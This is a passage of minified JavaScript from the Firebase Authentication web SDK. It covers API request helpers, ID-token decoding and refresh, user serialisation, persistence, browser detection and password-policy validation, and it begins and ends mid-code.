HA_TOKEN:"invalid-recaptcha-token",INVALID_RECAPTCHA_ACTION:"invalid-recaptcha-action",MISSING_CLIENT_TYPE:"missing-client-type",MISSING_RECAPTCHA_VERSION:"missing-recaptcha-version",INVALID_RECAPTCHA_VERSION:"invalid-recaptcha-version",INVALID_REQ_TYPE:"invalid-req-type"};var Vx=new ar(3e4,6e4);function wf(t,e){return t.tenantId&&!e.tenantId?Object.assign(Object.assign({},e),{tenantId:t.tenantId}):e}function Ei(o,s,a,c){return p(this,arguments,function*(t,e,n,r,i={}){return hw(t,i,()=>p(this,null,function*(){let l={},u={};r&&(e==="GET"?u=r:l={body:JSON.stringify(r)});let d=er(Object.assign({key:t.config.apiKey},u)).slice(1),h=yield t._getAdditionalHeaders();h["Content-Type"]="application/json",t.languageCode&&(h["X-Firebase-Locale"]=t.languageCode);let f=Object.assign({method:e,headers:h},l);return EI()||(f.referrerPolicy="no-referrer"),Lc.fetch()(fw(t,t.config.apiHost,n,d),f)}))})}function hw(t,e,n){return p(this,null,function*(){t._canInitEmulator=!1;let r=Object.assign(Object.assign({},Lx),e);try{let i=new rf(t),o=yield Promise.race([n(),i.promise]);i.clearNetworkTimeout();let s=yield o.json();if("needConfirmation"in s)throw Rc(t,"account-exists-with-different-credential",s);if(o.ok&&!("errorMessage"in s))return s;{let a=o.ok?s.errorMessage:s.error.message,[c,l]=a.split(" : ");if(c==="FEDERATED_USER_ID_ALREADY_LINKED")throw Rc(t,"credential-already-in-use",s);if(c==="EMAIL_EXISTS")throw Rc(t,"email-already-in-use",s);if(c==="USER_DISABLED")throw Rc(t,"user-disabled",s);let u=r[c]||c.toLowerCase().replace(/[_\s]+/g,"-");if(l)throw dw(t,u,l);Dn(t,u)}}catch(i){if(i instanceof ot)throw i;Dn(t,"network-request-failed",{message:String(i)})}})}function jx(o,s,a,c){return p(this,arguments,function*(t,e,n,r,i={}){let l=yield Ei(t,e,n,r,i);return"mfaPendingCredential"in l&&Dn(t,"multi-factor-auth-required",{_serverResponse:l}),l})}function fw(t,e,n,r){let i=`${e}${n}?${r}`;return t.config.emulator?If(t.config,i):`${t.config.apiScheme}://${i}`}var rf=class{constructor(e){this.auth=e,this.timer=null,this.promise=new Promise((n,r)=>{this.timer=setTimeout(()=>r(sr(this.auth,"network-request-failed")),Vx.get())})}clearNetworkTimeout(){clearTimeout(this.timer)}};function Rc(t,e,n){let r={appName:t.name};n.email&&(r.email=n.email),n.phoneNumber&&(r.phoneNumber=n.phoneNumber);let i=sr(t,e,r);return i.customData._tokenResponse=n,i}function Ux(t,e){return p(this,null,function*(){return Ei(t,"POST","/v1/accounts:delete",e)})}function pw(t,e){return p(this,null,function*(){return Ei(t,"POST","/v1/accounts:lookup",e)})}function qo(t){if(t)try{let e=new Date(Number(t));if(!isNaN(e.getTime()))return e.toUTCString()}catch{}}function Ef(t,e=!1){return p(this,null,function*(){let n=xe(t),r=yield n.getIdToken(e),i=Cf(r);D(i&&i.exp&&i.auth_time&&i.iat,n.auth,"internal-error");let o=typeof i.firebase=="object"?i.firebase:void 0,s=o?.sign_in_provider;return{claims:i,token:r,authTime:qo(Xh(i.auth_time)),issuedAtTime:qo(Xh(i.iat)),expirationTime:qo(Xh(i.exp)),signInProvider:s||null,signInSecondFactor:o?.sign_in_second_factor||null}})}function Xh(t){return Number(t)*1e3}function Cf(t){let[e,n,r]=t.split(".");if(e===void 0||n===void 0||r===void 0)return xc("JWT malformed, contained fewer than 3 sections"),null;try{let i=Lo(n);return i?JSON.parse(i):(xc("Failed to decode base64 JWT payload"),null)}catch(i){return xc("Caught error parsing JWT payload as JSON",i?.toString()),null}}function KI(t){let e=Cf(t);return D(e,"internal-error"),D(typeof e.exp<"u","internal-error"),D(typeof e.iat<"u","internal-error"),Number(e.exp)-Number(e.iat)}function Ko(t,e,n=!1){return p(this,null,function*(){if(n)return e;try{return yield e}catch(r){throw r instanceof ot&&Bx(r)&&t.auth.currentUser===t&&(yield t.auth.signOut()),r}})}function Bx({code:t}){return t==="auth/user-disabled"||t==="auth/user-token-expired"}var of=class{constructor(e){this.user=e,this.isRunning=!1,this.timerId=null,this.errorBackoff=3e4}_start(){this.isRunning||(this.isRunning=!0,this.schedule())}_stop(){this.isRunning&&(this.isRunning=!1,this.timerId!==null&&clearTimeout(this.timerId))}getInterval(e){var n;if(e){let r=this.errorBackoff;return this.errorBackoff=Math.min(this.errorBackoff*2,96e4),r}else{this.errorBackoff=3e4;let i=((n=this.user.stsTokenManager.expirationTime)!==null&&n!==void 0?n:0)-Date.now()-3e5;return Math.max(0,i)}}schedule(e=!1){if(!this.isRunning)return;let n=this.getInterval(e);this.timerId=setTimeout(()=>p(this,null,function*(){yield this.iteration()}),n)}iteration(){return p(this,null,function*(){try{yield this.user.getIdToken(!0)}catch(e){e?.code==="auth/network-request-failed"&&this.schedule(!0);return}this.schedule()})}};var Zo=class{constructor(e,n){this.createdAt=e,this.lastLoginAt=n,this._initializeTime()}_initializeTime(){this.lastSignInTime=qo(this.lastLoginAt),this.creationTime=qo(this.createdAt)}_copy(e){this.createdAt=e.createdAt,this.lastLoginAt=e.lastLoginAt,this._initializeTime()}toJSON(){return{createdAt:this.createdAt,lastLoginAt:this.lastLoginAt}}};function Vc(t){return p(this,null,function*(){var e;let n=t.auth,r=yield t.getIdToken(),i=yield Ko(t,pw(n,{idToken:r}));D(i?.users.length,n,"internal-error");let o=i.users[0];t._notifyReloadListener(o);let s=!((e=o.providerUserInfo)===null||e===void 0)&&e.length?gw(o.providerUserInfo):[],a=$x(t.providerData,s),c=t.isAnonymous,l=!(t.email&&o.passwordHash)&&!a?.length,u=c?l:!1,d={uid:o.localId,displayName:o.displayName||null,photoURL:o.photoUrl||null,email:o.email||null,emailVerified:o.emailVerified||!1,phoneNumber:o.phoneNumber||null,tenantId:o.tenantId||null,providerData:a,metadata:new Zo(o.createdAt,o.lastLoginAt),isAnonymous:u};Object.assign(t,d)})}function Df(t){return p(this,null,function*(){let e=xe(t);yield Vc(e),yield e.auth._persistUserIfCurrent(e),e.auth._notifyListenersIfCurrent(e)})}function $x(t,e){return[...t.filter(r=>!e.some(i=>i.providerId===r.providerId)),...e]}function gw(t){return t.map(e=>{var{providerId:n}=e,r=Fl(e,["providerId"]);return{providerId:n,uid:r.rawId||"",displayName:r.displayName||null,email:r.email||null,phoneNumber:r.phoneNumber||null,photoURL:r.photoUrl||null}})}function Hx(t,e){return p(this,null,function*(){let n=yield hw(t,{},()=>p(this,null,function*(){let r=er({grant_type:"refresh_token",refresh_token:e}).slice(1),{tokenApiHost:i,apiKey:o}=t.config,s=fw(t,i,"/v1/token",`key=${o}`),a=yield t._getAdditionalHeaders();return a["Content-Type"]="application/x-www-form-urlencoded",Lc.fetch()(s,{method:"POST",headers:a,body:r})}));return{accessToken:n.access_token,expiresIn:n.expires_in,refreshToken:n.refresh_token}})}function Wx(t,e){return p(this,null,function*(){return Ei(t,"POST","/v2/accounts:revokeToken",wf(t,e))})}var Yo=class t{constructor(){this.refreshToken=null,this.accessToken=null,this.expirationTime=null}get isExpired(){return!this.expirationTime||Date.now()>this.expirationTime-3e4}updateFromServerResponse(e){D(e.idToken,"internal-error"),D(typeof e.idToken<"u","internal-error"),D(typeof e.refreshToken<"u","internal-error");let n="expiresIn"in e&&typeof e.expiresIn<"u"?Number(e.expiresIn):KI(e.idToken);this.updateTokensAndExpiration(e.idToken,e.refreshToken,n)}updateFromIdToken(e){D(e.length!==0,"internal-error");let n=KI(e);this.updateTokensAndExpiration(e,null,n)}getToken(e,n=!1){return p(this,null,function*(){return!n&&this.accessToken&&!this.isExpired?this.accessToken:(D(this.refreshToken,e,"user-token-expired"),this.refreshToken?(yield this.refresh(e,this.refreshToken),this.accessToken):null)})}clearRefreshToken(){this.refreshToken=null}refresh(e,n){return p(this,null,function*(){let{accessToken:r,refreshToken:i,expiresIn:o}=yield Hx(e,n);this.updateTokensAndExpiration(r,i,Number(o))})}updateTokensAndExpiration(e,n,r){this.refreshToken=n||null,this.accessToken=e||null,this.expirationTime=Date.now()+r*1e3}static fromJSON(e,n){let{refreshToken:r,accessToken:i,expirationTime:o}=n,s=new t;return r&&(D(typeof r=="string","internal-error",{appName:e}),s.refreshToken=r),i&&(D(typeof i=="string","internal-error",{appName:e}),s.accessToken=i),o&&(D(typeof o=="number","internal-error",{appName:e}),s.expirationTime=o),s}toJSON(){return{refreshToken:this.refreshToken,accessToken:this.accessToken,expirationTime:this.expirationTime}}_assign(e){this.accessToken=e.accessToken,this.refreshToken=e.refreshToken,this.expirationTime=e.expirationTime}_clone(){return Object.assign(new t,this.toJSON())}_performRefresh(){return Gt("not implemented")}};function Cn(t,e){D(typeof t=="string"||typeof t>"u","internal-error",{appName:e})}var wi=class t{constructor(e){var{uid:n,auth:r,stsTokenManager:i}=e,o=Fl(e,["uid","auth","stsTokenManager"]);this.providerId="firebase",this.proactiveRefresh=new of(this),this.reloadUserInfo=null,this.reloadListener=null,this.uid=n,this.auth=r,this.stsTokenManager=i,this.accessToken=i.accessToken,this.displayName=o.displayName||null,this.email=o.email||null,this.emailVerified=o.emailVerified||!1,this.phoneNumber=o.phoneNumber||null,this.photoURL=o.photoURL||null,this.isAnonymous=o.isAnonymous||!1,this.tenantId=o.tenantId||null,this.providerData=o.providerData?[...o.providerData]:[],this.metadata=new Zo(o.createdAt||void 0,o.lastLoginAt||void 0)}getIdToken(e){return p(this,null,function*(){let n=yield Ko(this,this.stsTokenManager.getToken(this.auth,e));return D(n,this.auth,"internal-error"),this.accessToken!==n&&(this.accessToken=n,yield this.auth._persistUserIfCurrent(this),this.auth._notifyListenersIfCurrent(this)),n})}getIdTokenResult(e){return Ef(this,e)}reload(){return Df(this)}_assign(e){this!==e&&(D(this.uid===e.uid,this.auth,"internal-error"),this.displayName=e.displayName,this.photoURL=e.photoURL,this.email=e.email,this.emailVerified=e.emailVerified,this.phoneNumber=e.phoneNumber,this.isAnonymous=e.isAnonymous,this.tenantId=e.tenantId,this.providerData=e.providerData.map(n=>Object.assign({},n)),this.metadata._copy(e.metadata),this.stsTokenManager._assign(e.stsTokenManager))}_clone(e){let n=new t(Object.assign(Object.assign({},this),{auth:e,stsTokenManager:this.stsTokenManager._clone()}));return n.metadata._copy(this.metadata),n}_onReload(e){D(!this.reloadListener,this.auth,"internal-error"),this.reloadListener=e,this.reloadUserInfo&&(this._notifyReloadListener(this.reloadUserInfo),this.reloadUserInfo=null)}_notifyReloadListener(e){this.reloadListener?this.reloadListener(e):this.reloadUserInfo=e}_startProactiveRefresh(){this.proactiveRefresh._start()}_stopProactiveRefresh(){this.proactiveRefresh._stop()}_updateTokensIfNecessary(e,n=!1){return p(this,null,function*(){let r=!1;e.idToken&&e.idToken!==this.stsTokenManager.accessToken&&(this.stsTokenManager.updateFromServerResponse(e),r=!0),n&&(yield Vc(this)),yield this.auth._persistUserIfCurrent(this),r&&this.auth._notifyListenersIfCurrent(this)})}delete(){return p(this,null,function*(){if(Ht(this.auth.app))return Promise.reject(or(this.auth));let e=yield this.getIdToken();return yield Ko(this,Ux(this.auth,{idToken:e})),this.stsTokenManager.clearRefreshToken(),this.auth.signOut()})}toJSON(){return Object.assign(Object.assign({uid:this.uid,email:this.email||void 0,emailVerified:this.emailVerified,displayName:this.displayName||void 0,isAnonymous:this.isAnonymous,photoURL:this.photoURL||void 0,phoneNumber:this.phoneNumber||void 0,tenantId:this.tenantId||void 0,providerData:this.providerData.map(e=>Object.assign({},e)),stsTokenManager:this.stsTokenManager.toJSON(),_redirectEventId:this._redirectEventId},this.metadata.toJSON()),{apiKey:this.auth.config.apiKey,appName:this.auth.name})}get refreshToken(){return this.stsTokenManager.refreshToken||""}static _fromJSON(e,n){var r,i,o,s,a,c,l,u;let d=(r=n.displayName)!==null&&r!==void 0?r:void 0,h=(i=n.email)!==null&&i!==void 0?i:void 0,f=(o=n.phoneNumber)!==null&&o!==void 0?o:void 0,g=(s=n.photoURL)!==null&&s!==void 0?s:void 0,_=(a=n.tenantId)!==null&&a!==void 0?a:void 0,C=(c=n._redirectEventId)!==null&&c!==void 0?c:void 0,R=(l=n.createdAt)!==null&&l!==void 0?l:void 0,te=(u=n.lastLoginAt)!==null&&u!==void 0?u:void 0,{uid:ne,emailVerified:_e,isAnonymous:Et,providerData:fe,stsTokenManager:Ct}=n;D(ne&&Ct,e,"internal-error");let Fi=Yo.fromJSON(this.name,Ct);D(typeof ne=="string",e,"internal-error"),Cn(d,e.name),Cn(h,e.name),D(typeof _e=="boolean",e,"internal-error"),D(typeof Et=="boolean",e,"internal-error"),Cn(f,e.name),Cn(g,e.name),Cn(_,e.name),Cn(C,e.name),Cn(R,e.name),Cn(te,e.name);let Li=new t({uid:ne,auth:e,email:h,emailVerified:_e,displayName:d,isAnonymous:Et,photoURL:g,phoneNumber:f,tenantId:_,stsTokenManager:Fi,createdAt:R,lastLoginAt:te});return fe&&Array.isArray(fe)&&(Li.providerData=fe.map(WC=>Object.assign({},WC))),C&&(Li._redirectEventId=C),Li}static _fromIdTokenResponse(e,n,r=!1){return p(this,null,function*(){let i=new Yo;i.updateFromServerResponse(n);let o=new t({uid:n.localId,auth:e,stsTokenManager:i,isAnonymous:r});return yield Vc(o),o})}static _fromGetAccountInfoResponse(e,n,r){return p(this,null,function*(){let i=n.users[0];D(i.localId!==void 0,"internal-error");let o=i.providerUserInfo!==void 0?gw(i.providerUserInfo):[],s=!(i.email&&i.passwordHash)&&!o?.length,a=new Yo;a.updateFromIdToken(r);let c=new t({uid:i.localId,auth:e,stsTokenManager:a,isAnonymous:s}),l={uid:i.localId,displayName:i.displayName||null,photoURL:i.photoUrl||null,email:i.email||null,emailVerified:i.emailVerified||!1,phoneNumber:i.phoneNumber||null,tenantId:i.tenantId||null,providerData:o,metadata:new Zo(i.createdAt,i.lastLoginAt),isAnonymous:!(i.email&&i.passwordHash)&&!o?.length};return Object.assign(c,l),c})}};var ZI=new Map;function qt(t){bn(t instanceof Function,"Expected a class definition");let e=ZI.get(t);return e?(bn(e instanceof t,"Instance stored in cache mismatched with class"),e):(e=new t,ZI.set(t,e),e)}var zx=(()=>{class t{constructor(){this.type="NONE",this.storage={}}_isAvailable(){return p(this,null,function*(){return!0})}_set(n,r){return p(this,null,function*(){this.storage[n]=r})}_get(n){return p(this,null,function*(){let r=this.storage[n];return r===void 0?null:r})}_remove(n){return p(this,null,function*(){delete this.storage[n]})}_addListener(n,r){}_removeListener(n,r){}}return t.type="NONE",t})(),sf=zx;function Oc(t,e,n){return`firebase:${t}:${e}:${n}`}var jc=class t{constructor(e,n,r){this.persistence=e,this.auth=n,this.userKey=r;let{config:i,name:o}=this.auth;this.fullUserKey=Oc(this.userKey,i.apiKey,o),this.fullPersistenceKey=Oc("persistence",i.apiKey,o),this.boundEventHandler=n._onStorageEvent.bind(n),this.persistence._addListener(this.fullUserKey,this.boundEventHandler)}setCurrentUser(e){return this.persistence._set(this.fullUserKey,e.toJSON())}getCurrentUser(){return p(this,null,function*(){let e=yield this.persistence._get(this.fullUserKey);return e?wi._fromJSON(this.auth,e):null})}removeCurrentUser(){return this.persistence._remove(this.fullUserKey)}savePersistenceForRedirect(){return this.persistence._set(this.fullPersistenceKey,this.persistence.type)}setPersistence(e){return p(this,null,function*(){if(this.persistence===e)return;let n=yield this.getCurrentUser();if(yield this.removeCurrentUser(),this.persistence=e,n)return this.setCurrentUser(n)})}delete(){this.persistence._removeListener(this.fullUserKey,this.boundEventHandler)}static create(e,n,r="authUser"){return p(this,null,function*(){if(!n.length)return new t(qt(sf),e,r);let i=(yield Promise.all(n.map(l=>p(this,null,function*(){if(yield l._isAvailable())return l})))).filter(l=>l),o=i[0]||qt(sf),s=Oc(r,e.config.apiKey,e.name),a=null;for(let l of n)try{let u=yield l._get(s);if(u){let d=wi._fromJSON(e,u);l!==o&&(a=d),o=l;break}}catch{}let c=i.filter(l=>l._shouldAllowMigration);return!o._shouldAllowMigration||!c.length?new t(o,e,r):(o=c[0],a&&(yield o._set(s,a.toJSON())),yield Promise.all(n.map(l=>p(this,null,function*(){if(l!==o)try{yield l._remove(s)}catch{}}))),new t(o,e,r))})}};function QI(t){let e=t.toLowerCase();if(e.includes("opera/")||e.includes("opr/")||e.includes("opios/"))return"Opera";if(_w(e))return"IEMobile";if(e.includes("msie")||e.includes("trident/"))return"IE";if(e.includes("edge/"))return"Edge";if(mw(e))return"Firefox";if(e.includes("silk/"))return"Silk";if(ww(e))return"Blackberry";if(Ew(e))return"Webos";if(vw(e))return"Safari";if((e.includes("chrome/")||yw(e))&&!e.includes("edge/"))return"Chrome";if(Iw(e))return"Android";{let n=/([a-zA-Z\d\.]+)\/[a-zA-Z\d\.]*$/,r=t.match(n);if(r?.length===2)return r[1]}return"Other"}function mw(t=we()){return/firefox\//i.test(t)}function vw(t=we()){let e=t.toLowerCase();return e.includes("safari/")&&!e.includes("chrome/")&&!e.includes("crios/")&&!e.includes("android")}function yw(t=we()){return/crios\//i.test(t)}function _w(t=we()){return/iemobile/i.test(t)}function Iw(t=we()){return/android/i.test(t)}function ww(t=we()){return/blackberry/i.test(t)}function Ew(t=we()){return/webos/i.test(t)}function bf(t=we()){return/iphone|ipad|ipod/i.test(t)||/macintosh/i.test(t)&&/mobile/i.test(t)}function Gx(t=we()){var e;return bf(t)&&!!(!((e=window.navigator)===null||e===void 0)&&e.standalone)}function qx(){return DI()&&document.documentMode===10}function Cw(t=we()){return bf(t)||Iw(t)||Ew(t)||ww(t)||/windows phone/i.test(t)||_w(t)}function Dw(t,e=[]){let n;switch(t){case"Browser":n=QI(we());break;case"Worker":n=`${QI(we())}-${t}`;break;default:n=t}let r=e.length?e.join(","):"FirebaseCore-web";return`${n}/JsCore/${En}/${r}`}var af=class{constructor(e){this.auth=e,this.queue=[]}pushCallback(e,n){let r=o=>new Promise((s,a)=>{try{let c=e(o);s(c)}catch(c){a(c)}});r.onAbort=n,this.queue.push(r);let i=this.queue.length-1;return()=>{this.queue[i]=()=>Promise.resolve()}}runMiddleware(e){return p(this,null,function*(){if(this.auth.currentUser===e)return;let n=[];try{for(let r of this.queue)yield r(e),r.onAbort&&n.push(r.onAbort)}catch(r){n.reverse();for(let i of n)try{i()}catch{}throw this.auth._errorFactory.create("login-blocked",{originalMessage:r?.message})}})}};function Yx(n){return p(this,arguments,function*(t,e={}){return Ei(t,"GET","/v2/passwordPolicy",wf(t,e))})}var Kx=6,cf=class{constructor(e){var n,r,i,o;let s=e.customStrengthOptions;this.customStrengthOptions={},this.customStrengthOptions.minPasswordLength=(n=s.minPasswordLength)!==null&&n!==void 0?n:Kx,s.maxPasswordLength&&(this.customStrengthOptions.maxPasswordLength=s.maxPasswordLength),s.containsLowercaseCharacter!==void 0&&(this.customStrengthOptions.containsLowercaseLetter=s.containsLowercaseCharacter),s.containsUppercaseCharacter!==void 0&&(this.customStrengthOptions.containsUppercaseLetter=s.containsUppercaseCharacter),s.containsNumericCharacter!==void 0&&(this.customStrengthOptions.containsNumericCharacter=s.containsNumericCharacter),s.containsNonAlphanumericCharacter!==void 0&&(this.customStrengthOptions.containsNonAlphanumericCharacter=s.containsNonAlphanumericCharacter),this.enforcementState=e.enforcementState,this.enforcementState==="ENFORCEMENT_STATE_UNSPECIFIED"&&(this.enforcementState="OFF"),this.allowedNonAlphanumericCharacters=(i=(r=e.allowedNonAlphanumericCharacters)===null||r===void 0?void 0:r.join(""))!==null&&i!==void 0?i:"",this.forceUpgradeOnSignin=(o=e.forceUpgradeOnSignin)!==null&&o!==void 0?o:!1,this.schemaVersion=e.schemaVersion}validatePassword(e){var n,r,i,o,s,a;let c={isValid:!0,passwordPolicy:this};return this.validatePasswordLengthOptions(e,c),this.validatePasswordCharacterOptions(e,c),c.isValid&&(c.isValid=(n=c.meetsMinPasswordLength)!==null&&n!==void 0?n:!0),c.isValid&&(c.isValid=(r=c.meetsMaxPasswordLength)!==null&&r!==void 0?r:!0),c.isValid&&(c.isValid=(i=c.containsLowercaseLetter)!==null&&i!==void 0?i:!0),c.isValid&&(c.isValid=(o=c.containsUppercaseLetter)!==null&&o!==void 0?o:!0),c.isValid&&(c.isValid=(s=c.containsNumericCharacter)!==null&&s!==void 0?s:!0),c.isValid&&(c.isValid=(a=c.containsNonAlphanumericCharacter)!==null&&a!==void 0?a:!0),c}validatePasswordLengthOptions(e,n){let r=this.customStrengthOptions.minPasswordLength,i=this.customStrengthOptions.maxPasswordLength;r&&(n.meetsMinPasswordLength=e.length>=r),i&&(n.meetsMaxPasswordLength=e.length<=i)}validatePasswordCharacterOptions(e,n){this.updatePasswordCharacterOptionsStatuses(n,!1,!1,!1,!1);let r;for(let i=0;i<e.length;i++)r=e.charAt(i),this.updatePasswordCharacterOptionsStatuses(n,r>="a"&&r<="z",r>="A"&&r<="Z",r>="0"&&r<="9",this.allowedNonAlphanumericCharacters.includes(r))}updatePasswordCharacterOptionsStatuses(e,n,r,i,o){this.customStrengthOptions.containsLowercaseLetter&&(e.containsLowercaseLetter||(e.containsLowercaseLetter=n)),this.customStrengthOptions.containsUppercaseLetter&&(e.containsUppercaseLetter||(e.containsUppercaseLetter=r)),this.customStrengthOptions.containsNumericCharacter&&(e.containsNumericCharacter||(e.containsNumericCharacter=i)),this.customStrengthOptions.containsNonAlphanumericCharacter&&(e.containsNonAlphanumericCharacter||(e.containsNonAlphanumericCharacter=o))}};var lf=class{constructor(e,n,r,i){this.app=e,this.heartbeatServiceProvider=n,this.appCheckServiceProvider=r,this.config=i,this.currentUser=null,this.emulatorConfig=null,this.operations=Promise.resolve(),this.authStateSubscription=new Uc(this),this.idTokenSubscription=new Uc(this),this.beforeStateQueue=new af(this),this.redirectUser=null,this.isProactiveRefreshEnabled=!1,this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION=1,this._canInitEmulator=!0,this._isInitialized=!1,this._deleted=!1,this._initializationPromise=null,this._popupRedirectResolver=null,this._errorFactory=uw,this._agentRecaptchaConfig=null,this._tenantRecaptchaConfigs={},this._projectPasswordPolicy=null,this._tenantPasswordPolicies={},this.lastNotifiedUid=void 0,this.languageCode=null,this.tenantId=null,this.settings={appVerificationDisabledForTesting:!1},this.frameworks=[],this.name=e.name,this.clientVersion=i.sdkClientVersion}_initializeWithPersistence(e,n){return n&&(this._popupRedirectResolver=qt(n)),this._initializationPromise=this.queue(()=>p(this,null,function*(){var r,i;if(!this._deleted&&(this.persistenceManager=yield jc.create(this,e),!this._deleted)){if(!((r=this._popupRedirectResolver)===null||r===void 0)&&r._shouldInitProactively)try{yield this._popupRedirectResolver._initialize(this)}catch{}yield this.initializeCurrentUser(n),this.lastNotifiedUid=((i=this.currentUser)===null||i===void 0?void 0:i.uid)||null,!this._deleted&&(this._isInitialized=!0)}})),this._initializationPromise}_onStorageEvent(){return p(this,null,function*(){if(this._deleted)return;let e=yield this.assertedPersistence.getCurrentUser();if(!(!this.currentUser&&!e)){if(this.currentUser&&e&&this.currentUser.uid===e.uid){this._currentUser._assign(e),yield this.currentUser.getIdToken();return}yield this._updateCurrentUser(e,!0)}})}initializeCurrentUserFromIdToken(e){return p(this,null,function*(){try{let n=yield pw(this,{idToken:e}),r=yield wi._fromGetAccountInfoResponse(this,n,e);yield this.directlySetCurrentUser(r)}catch(n){console.warn("FirebaseServerApp could not login user with provided authIdToken: ",n),yield this.directlySetCurrentUser(null)}})}initializeCurrentUser(e){return p(this,null,function*(){var n;if(Ht(this.app)){let s=this.app.settings.authIdToken;return s?new Promise(a=>{setTimeout(()=>this.initializeCurrentUserFromIdToken(s).then(a,a))}):this.directlySetCurrentUser(null)}let r=yield this.assertedPersistence.getCurrentUser(),i=r,o=!1;if(e&&this.config.authDomain){yield this.getOrInitRedirectPersistenceManager();let s=(n=this.redirectUser)===null||n===void 0?void 0:n._redirectEventId,a=i?._redirectEventId,c=yield this.tryRedirectSignIn(e);(!s||s===a)&&c?.user&&(i=c.user,o=!0)}if(!i)return this.directlySetCurrentUser(null);if(!i._redirectEventId){if(o)try{yield this.beforeStateQueue.runMiddleware(i)}catch(s){i=r,this._popupRedirectResolver._overrideRedirectResult(this,()=>Promise.reject(s))}return i?this.reloadAndSetCurrentUserOrClear(i):this.directlySetCurrentUser(null)}return D(this._popupRedirectResolver,this,"argument-error"),yield this.getOrInitRedirectPersistenceManager(),this.redirectUser&&this.redirectUser._redirectEventId===i._redirectEventId?this.directlySetCurrentUser(i):this.reloadAndSetCurrentUserOrClear(i)})}tryRedirectSignIn(e){return p(this,null,function*(){let n=null;try{n=yield this._popupRedirectResolver._completeRedirectFn(this,e,!0)}catch{yield this._setRedirectUser(null)}return n})}reloadAndSetCurrentUserOrClear(e){return p(this,null,function*(){try{yield Vc(e)}catch(n){if(n?.code!=="auth/network-request-failed")return this.directlySetCurrentUser(null)}return this.directlySetCurrentUser(e)})}useDeviceLanguage(){this.languageCode=Fx()}_delete(){return p(this,null,function*(){this._deleted=!0})}updateCurrentUser(e){return p(this,null,function*(){if(Ht(this.app))return Promise.reject(or(this));let n=e?xe(e):null;return n&&D(n.auth.config.apiKey===this.config.apiKey,this,"invalid-user-token"),this._updateCurrentUser(n&&n._clone(this))})}_updateCurrentUser(e,n=!1){return p(this,null,function*(){if(!this._deleted)return e&&D(this.tenantId===e.tenantId,this,"tenant-id-mismatch"),n||(yield this.beforeStateQueue.runMiddleware(e)),this.queue(()=>p(this,null,function*(){yield this.directlySetCurrentUser(e),this.notifyAuthListeners()}))})}signOut(){return p(this,null,function*(){return Ht(this.app)?Promise.reject(or(this)):(yield this.beforeStateQueue.runMiddleware(null),(this.redirectPersistenceManager||this._popupRedirectResolver)&&(yield this._setRedirectUser(null)),this._updateCurrentUser(null,!0))})}setPersistence(e){return Ht(this.app)?Promise.reject(or(this)):this.queue(()=>p(this,null,function*(){yield this.assertedPersistence.setPersistence(qt(e))}))}_getRecaptchaConfig(){return this.tenantId==null?this._agentRecaptchaConfig:this._tenantRecaptchaConfigs[this.tenantId]}validatePassword(e){return p(this,null,function*(){this._getPasswordPolicyInternal()||(yield this._updatePasswordPolicy());let n=this._getPasswordPolicyInternal();return n.schemaVersion!==this.EXPECTED_PASSWORD_POLICY_SCHEMA_VERSION?Promise.reject(this._errorFactory.create("unsupported-password-policy-schema-version",{})):n.validatePassword(e)})}_getPasswordPolicyInternal(){return this.tenantId===null?this._projectPasswordPolicy:this._tenantPasswordPolicies[this.tenantId]}_updatePasswordPolicy(){return p(this,null,function*(){let e=yield Yx(this),n=new cf(e);this.tenantId===null?this._projectPasswordPolicy=n:this._tenantPasswordPolicies[this.tenantId]=n})}_getPersistence(){return this.assertedPersistence.persistence.type}_updateErrorMap(e){this._errorFactory=new Bt("auth","Firebase",e())}onAuthStateChanged(e,n,r){return this.registerStateListener(this.authStateSubscription,e,n,r)}beforeAuthStateChanged(e,n){return this.beforeStateQueue.pushCallback(e,n)}onIdTokenChanged(e,n,r){return this.registerStateListener(this.idTokenSubscription,e,n,r)}authStateReady(){return new Promise((e,n)=>{if(this.currentUser)e();else{let r=this.onAuthStateChanged(()=>{r(),e()},n)}})}revokeAccessToken(e){return p(this,null,function*(){if(this.currentUser){let n=yield this.currentUser.getIdToken(),r={providerId:"apple.com",tokenType:"ACCESS_TOKEN",token:e,idToken:n};this.tenantId!=null&&(r.tenantId=this.tenantId),yield Wx(this,r)}})}toJSON(){var e;return{apiKey:this.config.apiKey,authDomain:this.config.authDomain,appName:this.name,currentUser:(e=this._currentUser)===null||e===void 0?void 0:e.toJSON()}}_setRedirectUser(e,n){return p(this,null,function*(){let r=yield this.getOrInitRedirectPersistenceManager(n);return e===null?r.removeCurrentUser():r.setCurrentUser(e)})}getOrInitRedirectPersistenceManager(e){return p(this,null,function*(){if(!this.redirectPersistenceManager){let n=e&&qt(e)||this._popupRedirectResolver;D(n,this,"argument-error"),this.redirectPersistenceManager=yield jc.create(this,[qt(n._redirectPersistence)],"redirectUser"),this.redirectUser=yield this.redirectPersistenceManager.getCurrentUser()}return this.redirectPersistenceManager})}_redirectUserForId(e){return p(this,null,function*(){var n,r;return this._isInitialized&&(yield this.queue(()=>p(this,null,function*(){}))),((n=this._currentUser)===null||n===void 0?void 0:n._redirectEventId)===e?this._currentUser:((r=this.redirectUser)===null||r===void 0?void 0:r._redirectEventId)===e?this.redirectUser:null})}_persistUserIfCurrent(e){return p(this,null,function*(){if(e===this.currentUser)return this.queue(()=>p(this,null,function*(){return this.directlySetCurrentUser(e)}))})}_notifyListenersIfCurrent(e){e===this.currentUser&&this.notifyAuthListeners()}_key(){return`${this.config.authDomain}:${this.config.apiKey}:${this.name}`}_startProactiveRefresh(){this.isProactiveRefreshEnabled=!0,this.currentUser&&this._currentUser._startProactiveRefresh()}_stopProactiveRefresh(){this.isProactiveRefreshEnabled=!1,this.currentUser&&this._currentUser._stopProactiveRefresh()}get _currentUser(){return this.currentUser}notifyAuthListeners(){var e,n;if(!this._isInitialized)return;this.idTokenSubscription.next(this.currentUser);let r=(n=(e=this.currentUser)===null||e===void 0?void 0:e.uid)!==null&&n!==void 0?n:null;this.lastNotifiedUid!==r&&(this.lastNotifiedUid=r,this.authStateSubscription.next(this.currentUser))}registerStateListener(e,n,r,i){if(this._deleted)return()=>{};let o=typeof n=="function"?n:n.next.bind(n),s=!1,a=this._isInitialized?Promise.resolve():this._initializationPromise;if(D(a,this,"internal-error"),a.then(()=>{s||o(this.currentUser)}),typeof n=="function"){let c=e.addObserver(n,r,i);return()=>{s=!0,c()}}else{let c=e.addObserver(n);return()=>{s=!0,c()}}}directlySetCurrentUser(e){return p(this,null,function*(){this.currentUser&&this.currentUser!==e&&this._currentUser._stopProactiveRefresh(),e&&this.isProactiveRefreshEnabled&&e._startProactiveRefresh(),this.currentUser=e,e?yield 